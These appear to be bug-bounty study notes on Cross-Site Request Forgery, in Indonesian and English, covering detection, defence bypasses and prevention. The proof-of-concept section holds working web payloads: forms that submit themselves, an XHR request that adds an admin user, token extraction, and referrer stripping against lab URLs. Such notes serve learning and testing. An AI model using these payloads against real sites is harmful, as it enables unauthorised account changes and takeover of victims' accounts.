# CSRF
Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend mengeksekusi perintah yang tidak seharusnya dizinkan, menipu website dari request user yang terpercaya dan mengirim Request palsu dari authenticate user. Terdapat 2 penyebab suatu aplikasi rentan akan CSRF, yaitu:
- Tidak ada pertahanan anti-CSRF
- Anti CSRF yang lemah (cookie only based solution, confirmation screen, using POST, dan weak referrer header)
<img width=500 src="https://user-images.githubusercontent.com/52058660/121773442-33437280-cba6-11eb-8890-9f5d2f7900fa.png">


## HOW TO FIND THEM
- Cek Form yang tidak menirimkanan extra token ketika melakukan request, biasanya dilabeli dengan csrf_token, csrf, token dll
- Misalkan saat mengganti password, tidak ada form confirmation untuk memasukkan password yang cuurent digunakan
- Cari form yang menggnerate impact, seperti pembayaran, pengantian password, hapus file, dan menambahkan file
- No CSRF token, 80% pasti ada bug
- The easiest way to check whether an application is vulnerable is to see if each link and form contains an unpredictable token for each user. Without such an unpredictable token, attackers can forge malicious requests. Focus on the links and forms that invoke state-changing functions, since those are the most important CSRF targets.
- "When first hunting for CSRF bugs I look for areas on the website which should contain protection around them, such as updating your account information."
  - What behavior do you see when sending a blank CSRF value, did it reveal any framework information from an error?
  - Did it reflect your changes but with a CSRF error?
  - Have you seen this parameter name used on other websites? Perhaps there isn’t even any protection! Test their most secure features (account functions usually as mentioned above) and work your way backwards.
- Jika Session aplikasi bergantung pada `http cookie` dan `basic authentication`
- Cek misconfigurasi CORS, sebenarnya CORS malah melemahkan browser karena melonggarkan aturan dari Same-origin policy sehingga apabila terjadi misconfigurasi CORS, attacker dapat memanfaatkan celah tersebut untuk melancarkan serangan CSRF.


## Bypass
- Ketika kita berhasil mengeksploitasi XSS, segala defense mechanisms terhadap CSRF menjadi useless.
- Bypass referer header
  - Salah satu langkah preventif untuk menanggulangi CSRF adalah memastian referer header berisikan website yang valid. Tapi bagaimana jika fielder header tersebut dihilangkan? kadang kita bisa membypass nya dengan meta tag berikut.
    ```
    <meta name="referrer" content="no-referrer" />
    <iframe src=”data:text/html;base64,form_code_here”>
    ```
  - Kadang developer juga hanya memastika bahwa referer header mengandung domain mereka, kita bisa mengakalinya dengan menambahkan sebuah direktori dengan domain target pada evil server kita, contoh: `https://www.yoursite.com/https://www.theirsite.com/` atau `https://www.theirsite.computer/`.
- Samesite cookie, bisa dibypass dengan modifikasi GET

## POC

- Menggunakan HTML Form
  ```
  <form method="$method" action="$url">
    <input type="hidden" name="$param1name" value="$param1value">
    <input type="submit" value="submit">
    </form>
  <script> document.forms[0].submit();</script>
  ```
  ```
  <form action="change.php" method="POST" id="CSRForm">
    <input name="old" value="myC00lemail@victim.site">
    <input name="new" value="evil@hacker.site">
    <img src=x onerror="CSRForm.submit();">
  </form>
  ```
- Menggunakan XHR
  ```
  <script type="text/javascript">
    var url =  "http://1.csrf.labs/add_user.php";
    var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=";    
    var CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, true);
    CSRF.withCredentials = 'true'; //IMPORTANTMUST!!
    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    CSRF.send(params);
  </script> 
  ```  
- XHR dengan extract token
  ```
  <script type="text/javascript">
 
  function addUser() {
    var url = "http://3.csrf.labs/add_user.php";
    var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=&CSRFtoken=" + token;
    var CSRF = new XMLHttpRequest();
 
    CSRF.open("POST", url, true);
    CSRF.withCredentials = 'true'; //IMPORTANTMUST!!
    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    CSRF.send(params);
    }
 
  // Extract the token
  var XHR = new XMLHttpRequest();
  
  XHR.onreadystatechange = function(){
    if(XHR.readyState == 4 ) {
        var htmlSource = XHR.responseText; // the source of users.php

        // Extract the token  
        var parser = new DOMParser().parseFromString(htmlSource, "text/html");
        var token = parser.getElementById('CSRFToken').value;
        addUser(token);
        }
 
  XHR.open('GET', 'http://3.csrf.labs/users.php', true);
  XHR.send();
 
  </script>

  ```
- Bypass Referrer
  ```
  <meta name=”referrer” content=”no-referrer”>
    <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="acun@hacker.site">
  </form>  
  <script>
    document.forms[0].submit();
  </script>
  ```
  
  ```
    ```
  <meta name=”referrer” content=”no-referrer”>
    <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="acun@hacker.site">
  </form>  
  <script>
    document.forms[0].submit();
  </script>
  ```
  tambahkan 'eferrer-Policy: unsafe-url" pada repeater
  
  <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="acun@hacker.site">
  </form>  
  <script>
    document.forms[0].submit();
    history.pushState("", "", "/?ac6e1f5a1e29fc3dc04ec83d00c30066.web-security-academy.net");
  </script>
  ```
  
## PREVENTION
- CSRF Token
  - CSRF token should be generated on the server-side
  - CSRF token should not be transmitted using cookies
  - CSRF token should be unique per session, secret, and unpredictable
  - CSRF token should no be leaked in the server logs or in the URL

- Double submit Cookie
  ```
  POST /email/change HTTP/1.1
  Host: vulnerable-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 68
  Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

  csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com 
  ```
- Samesite Cookie
  ```
  Set-Cookie: JSESSIONID=xxxxx; SameSite=Strict
  Set-Cookie: JSESSIONID=xxxxx; SameSite=Lax
  ```


## RESOURCE
- [OWASP - Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [OWASP - Reviewing Code for Cross-Site Request Forgery Issues Overview](https://owasp.org/www-project-code-review-guide/reviewing-code-for-csrf-issues)
- [OWASP Web Security Testing Guide - Testing for Cross Site Request Forgery](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)
- [OWASP Cheat Sheet Series - Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [InsiderPhD - Finding Your First Bug: Cross-Site Request Forgery (CSRF)](https://www.youtube.com/watch?v=ULvf6N8AL2A)
- [CSRF, CORS, and HTTP Security headers Demystified](https://blog.vnaik.com/posts/web-attacks.html)[PayloadsAllTheThings - Cross-Site Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection#methodology)
- [Zseano's Methodology - CSRF](https://www.bugbountyhunter.com/methodology/loader.php#page=22)
- [BugBountyHunter - CSRF](https://www.bugbountyhunter.com/vulnerability/?type=csrf)
- [Portswigger Academy - Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
- [OWASP Juice Shop - Broken Access Control](https://owasp.org/www-project-juice-shop)
- [OWASP Security Knowledge Framework - CSRF](https://owasp-skf.gitbook.io/asvs-write-ups/kbid-5-csrf)

## WRITE-UP
|Write-ups|Analisa|
|---|---|
|[CSRF at Kaskus.co.id](https://medium.com/@daffailhamr/csrf-at-kaskus-co-id-f8e31864807f)||
|[Refocusing in bug hunting, Bonus: An interestingly simple to test CSRF bypass](https://medium.com/bugbountywriteup/refocusing-in-bug-hunting-bonus-an-interestingly-simple-to-test-csrf-bypass-8595b3312147)|Mengganti content-type non-form  (i.e. `application/json, application/x-url-encoded`, etc.) menjadi `form-multipart`|
|[Got Nice catch by Google](https://parthdeshani.medium.com/got-nice-catch-by-google-5e6a8211371c)|Periksa parameter state. State parameter is used in Oauth to prevent CSRF attacks|
[JSON CSRF To FormData Attack](https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2)


